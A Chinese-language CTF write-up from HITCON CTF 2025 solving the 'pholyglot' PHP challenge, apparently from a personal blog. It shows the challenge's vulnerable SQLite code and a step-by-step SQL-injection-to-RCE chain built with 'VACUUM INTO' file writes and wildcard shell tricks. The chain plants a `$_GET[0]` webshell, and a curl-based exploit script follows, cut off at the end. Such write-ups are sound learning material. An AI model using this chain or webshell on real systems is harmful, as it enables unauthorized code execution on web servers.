[{"content":"\u003ch1 id=\"hitconctf-2025-writeup\"\u003ehitconctf-2025-writeup\u003c/h1\u003e\n\u003cp\u003e今年因為決賽是台灣限定交流賽，台灣前四就能打決賽，因此我們跟竹狐還有吉娃娃跟 Cake 就提議說拆開打（雖說竹狐那邊不知在衝三小賽前一週給我偷襲收了一坨人進去，只能說譴責：（ 說好分開打都假的\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/user-attachments/assets/3bf316ac-1861-4008-9378-b1a5575300ae\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/user-attachments/assets/91636a76-8533-47f6-a62e-470f01c2543d\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/user-attachments/assets/6f93432e-6179-4810-abd0-43ba222d9080\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/user-attachments/assets/c1e9d7ca-1e5f-4647-87c7-a7619135e808\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/user-attachments/assets/e391e79d-3e14-4eff-9991-ce48db468621\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e然而這次剛好卡\u003ca href=\"https://localadmissions.yzu.edu.tw/campCont?id=31\"\u003e元智資安體驗營\u003c/a\u003e我跟 \u003ca href=\"https://blog.vincent55.tw/\"\u003eVincent\u003c/a\u003e 還有\u003ca href=\"https://blog.trianglesnake.com/\"\u003e三角蛇\u003c/a\u003e有接講師，\u003cdel\u003e然後我題目簡報還沒生出來\u003c/del\u003e，再加上前天熬夜破台 OSEP 很想睡覺所以初賽只能解一題半 \u003ca href=\"https://blog.orange.tw/\"\u003eorange\u003c/a\u003e 的題目幫幫忙QQ。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/user-attachments/assets/5a89bee6-4ea7-43e3-bf95-843767c2f368\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/user-attachments/assets/11e20150-d56a-4792-963c-fc6d38ccee69\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e這邊就來寫一下我解的題目 writeup。\u003c/p\u003e\n\u003ch2 id=\"戰績\"\u003e戰績\u003c/h2\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/user-attachments/assets/e14e0c77-f11a-4773-b8d2-fc29bb0a12ab\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/user-attachments/assets/fe6ead10-a006-4aae-ad62-5dc1e8186931\" alt=\"image\"\u003e\u003c/p\u003e\n\u003ch2 id=\"pholyglot\"\u003epholyglot\u003c/h2\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/user-attachments/assets/e078ea1f-eb31-4a6e-a078-361f89298f0a\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e題目長這樣\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-php\" data-lang=\"php\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e\u0026lt;?\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ephp\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    $sandbox \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;/www/sandbox/\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emd5\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;orange\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003e $_SERVER[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;REMOTE_ADDR\u0026#39;\u003c/span\u003e]);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003e@\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003emkdir\u003c/span\u003e($sandbox);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003e@\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003echdir\u003c/span\u003e($sandbox) \u003cspan style=\"color:#66d9ef\"\u003eor\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003edie\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;err?\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    $msg \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e@\u003c/span\u003e$_GET[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;msg\u0026#39;\u003c/span\u003e];\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003eisset\u003c/span\u003e($msg) \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003estrlen\u003c/span\u003e($msg) \u003cspan style=\"color:#f92672\"\u003e\u0026lt;=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e30\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003eusleep\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003erandom_int\u003c/span\u003e(\u003cspan style=\"color:#ae81ff\"\u003e133\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e3337\u003c/span\u003e));\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        $db \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enew\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eSQLite3\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;.db\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        $db\u003cspan style=\"color:#f92672\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eexec\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003esprintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e            CREATE TABLE msg (content TEXT);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e            INSERT INTO msg VALUES(\u0026#39;%s\u0026#39;);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e        \u0026#34;\u003c/span\u003e, $msg));\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        $db\u003cspan style=\"color:#f92672\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eclose\u003c/span\u003e();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003eunlink\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;.db\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    } \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003eisset\u003c/span\u003e($_GET[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;reset\u0026#39;\u003c/span\u003e])) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003e@\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eexec\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;/bin/rm -rf \u0026#39;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003e $sandbox);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    } \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003ehighlight_file\u003c/span\u003e(\u003cspan style=\"color:#66d9ef\"\u003e__FILE__\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e要你拿 rce 拿 shell ，有一個裸的 SQLi 但限制 30 字，我們可以利用 sqlite 的 \u003ccode\u003eVACUUM INTO\u003c/code\u003e 來寫檔，經過極限的壓縮，最小可以寫出一個可以執行 3 個字 shell 指令 php 的 SQLi EX: \u003ccode\u003e\u0026lt;?=`cat`;');VACUUM INTO('c.php\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e如果說可以執行四個字就可以用 \u003ca href=\"https://github.com/orangetw/My-CTF-Web-Challenges?tab=readme-ov-file#babyfirst-revenge-v2\"\u003e2017 orange 出的 4 字 php RCE 解掉了\u003c/a\u003e 所以這邊想辦法讓能執行的指令長度變長，後來想到我可以用 SQLi 寫檔寫出一組 cp 或 mv 的指令後去蓋原本存在的 php 檔來讓我能跑的指令長度變長，比如：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecurl \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$1\u003cspan style=\"color:#e6db74\"\u003e/?msg=\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003eurlencode \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#39;);VACUUM INTO(\u0026#39;cp\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecurl \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$1\u003cspan style=\"color:#e6db74\"\u003e/?msg=\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003eurlencode \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026lt;?=`ip add`;\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#39;);VACUUM INTO(\u0026#39;z\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecurl \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$1\u003cspan style=\"color:#e6db74\"\u003e/?msg=\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003eurlencode \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026lt;?=`*`;\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#39;);VACUUM INTO(\u0026#39;z.php\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecurl \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$1\u003cspan style=\"color:#e6db74\"\u003e/sandbox/\u003c/span\u003e$2\u003cspan style=\"color:#e6db74\"\u003e/z.php\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecurl \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$1\u003cspan style=\"color:#e6db74\"\u003e/sandbox/\u003c/span\u003e$2\u003cspan style=\"color:#e6db74\"\u003e/z.php\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e這樣就成功把能執行的指令長度變長了，而且還不需要 RCE 寫檔建 gadget，只需要 SQLi 寫檔就好。\u003c/p\u003e\n\u003cp\u003e所以流程就是：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e寫檔 \u003ccode\u003ecp\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e寫檔 \u003ccode\u003ez\u003c/code\u003e 內容為 \u003ccode\u003e\u0026lt;?=`ls\u0026gt;_`;\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e寫檔 \u003ccode\u003ez.php\u003c/code\u003e 內容為 \u003ccode\u003e\u0026lt;?=`*`;\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e瀏覽 \u003ccode\u003ez.php\u003c/code\u003e 觸發 \u003ccode\u003e*\u003c/code\u003e 會執行 \u003ccode\u003ecp z z.php\u003c/code\u003e 將 \u003ccode\u003ez.php\u003c/code\u003e 的內容改為 \u003ccode\u003e\u0026lt;?=`ls\u0026gt;_`;\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e寫檔 \u003ccode\u003ecz\u003c/code\u003e 內容為 \u003ccode\u003e\u0026lt;?=`sh _`;\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e寫檔 \u003ccode\u003ecz.php\u003c/code\u003e 內容為 \u003ccode\u003e\u0026lt;?=`c*`;\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e瀏覽 \u003ccode\u003ecz.php\u003c/code\u003e 觸發 \u003ccode\u003ec*\u003c/code\u003e 會執行 \u003ccode\u003ecp cz cz.php\u003c/code\u003e 將 \u003ccode\u003ecz.php\u003c/code\u003e 的內容改為 \u003ccode\u003e\u0026lt;?=`sh _`;\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e寫檔 \u003ccode\u003emv\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e寫檔 \u003ccode\u003emz\u003c/code\u003e 內容為 \u003ccode\u003e\u0026lt;?=`sh x`;\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e寫檔 \u003ccode\u003emz.php\u003c/code\u003e 內容為 \u003ccode\u003e\u0026lt;?=`m*`;\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e瀏覽 \u003ccode\u003emz.php\u003c/code\u003e 觸發 \u003ccode\u003em*\u003c/code\u003e 會執行 \u003ccode\u003emv mz mz.php\u003c/code\u003e 將 \u003ccode\u003emz.php\u003c/code\u003e 的內容改為 \u003ccode\u003e\u0026lt;?=`sh x`;\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e寫檔 \u003ccode\u003els -t\u0026gt;x\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e瀏覽 \u003ccode\u003ez.php\u003c/code\u003e 觸發 \u003ccode\u003els\u0026gt;_\u003c/code\u003e 會將以下內容寫入 \u003ccode\u003e_\u003c/code\u003e 檔案\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecp\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecz\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecz.php\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003els -t\u0026gt;x\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003emv\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003emz.php\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ez\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ez.php\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003col start=\"14\"\u003e\n\u003cli\u003e寫檔 \u003ccode\u003e\u0026gt;a.php\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e寫檔 \u003ccode\u003e`$_GET[0]`;\u0026rsquo;\\\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e寫檔 \u003ccode\u003eecho '\u0026lt;?=\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e瀏覽 \u003ccode\u003ecz.php\u003c/code\u003e 觸發 \u003ccode\u003esh _\u003c/code\u003e 會將以下內容寫入 \u003ccode\u003ex\u003c/code\u003e 檔案\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026lt;?=\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e`$_GET[0]`;\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e\u0026gt;a.php\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e_\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003els -t\u0026gt;x\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003emz.php\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003emv\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecz.php\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecz\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ez.php\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ez\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecp\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003col start=\"18\"\u003e\n\u003cli\u003e瀏覽 \u003ccode\u003emz.php\u003c/code\u003e 觸發 \u003ccode\u003esh x\u003c/code\u003e 會將以下內容寫入 \u003ccode\u003ea.php\u003c/code\u003e 檔案\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-php\" data-lang=\"php\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e\u0026lt;?=\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e`$_GET[0]`\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#!/bin/bash\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecurl \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$1\u003cspan style=\"color:#e6db74\"\u003e/?msg=\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003eurlencode \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#39;);VACUUM INTO(\u0026#39;cp\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecurl \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$1\u003cspan style=\"color:#e6db74\"\u003e/?msg=\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003eurlencode \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026lt;?=`ls\u0026gt;_`;\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#39;);VACUUM INTO(\u0026#39;z\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecurl \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$1\u003cspan style=\"color:#e6db74\"\u003e/?msg=\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003eurlencode \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026lt;?=`*`;\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#39;);VACUUM INTO(\u0026#39;z.php\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecurl \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$1\u003cspan style=\"color:#e6db74\"\u003e/sandbox/\u003c/span\u003e$2\u003cspan style=\"color:#e6db74\"\u003e/z.php\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecurl \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$1\u003cspan style=\"color:#e6db74\"\u003e/?msg=\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003eurlencode \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026lt;?=`sh _`;\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#39;);VACUUM INTO(\u0026#39;cz\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecurl \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$1\u003cspan style=\"color:#e6db74\"\u003e/?msg=\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003eurlencode \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026lt;?=`c*`;\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#39;);VACUUM INTO(\u0026#39;cz.php\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecurl \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$1\u003cspan style=\"color:#e6db74\"\u003e/sandbox/\u003c/span\u003e$2\u003cspan style=\"color:#e6db74\"\u003e/cz.php\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecurl \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$1\u003cspan style=\"color:#e6db74\"\u003e/?msg=\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003eurlencode \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#39;);VACUUM INTO(\u0026#39;mv\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecurl \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$1\u003cspan style=\"color:#e6db74\"\u003e/?msg=\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003eurlencode \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026lt;?=`sh x`;\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#39;);VACUUM INTO(\u0026#39;mz\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecurl \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$1\u003cspan style=\"color:#e6db74\"\u003e/?msg=\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003eurlencode \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026lt;?=`m*`;\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#39;);VACUUM INTO(\u0026#39;mz.php\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecurl \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$1\u003cspan style=\"color:#e6db74\"\u003e/sandbox/\u003c/span\u003e$2\u003cspan style=\"color:#e6db74\"\u003e/mz.php\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecurl \u003cspan 